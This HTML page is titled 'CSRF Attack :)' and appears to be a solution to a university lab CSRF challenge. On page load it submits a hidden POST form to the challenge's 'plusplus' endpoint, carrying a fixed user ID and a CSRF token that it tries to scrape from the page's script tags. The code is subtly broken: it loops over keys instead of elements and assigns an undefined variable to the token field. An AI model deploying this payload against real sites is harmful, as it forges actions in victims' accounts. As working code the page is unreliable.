<html>
  <head>
    <title>CSRF Attack :)</title>
  </head>
  <body onload="submitForm()">
    <img src="https://teachprivacy.com/wp-content/uploads/Hacker5.jpg" style="width: 215px;" />
    <form action="https://snickerboa.it.liu.se/user/csrfchallengetwo/plusplus" name="CSRF_form" method="POST" target="hidden_results" style="display:none">
      <input type="text" name="userId" value="a542f4e2820395776b667dd3df282e24dd2f2095" />
      <input type="text" id="csrfToken" name="csrfToken" value="1" />
    </form>
  </body>
  <iframe name="hidden_results"></iframe>
  <script>
    function submitForm() {
      const scriptTags = document.getElementsByTagName("script");
      console.log(scriptTags);
      console.log(parent.document.getElementsByTagName("script"))
      var csrfValue = "";

      for (const tag in scriptTags) {
        var tagContent = tag.text;
        console.log(tag);

        if (tagContent.indexOf("csrfToken") != -1) {
          csrfValue = tagContent.split("csrfToken: \"")[1].split("\"")[0];
          break;
        }
      }

      if (csrfValue === "") {
        console.log("Failed CSRF, could not get token...")
        return;
      }

      document.getElementById("csrfToken").value = scriptTagContent;

      document.CSRF_form.submit();
    }
  </script>
</html>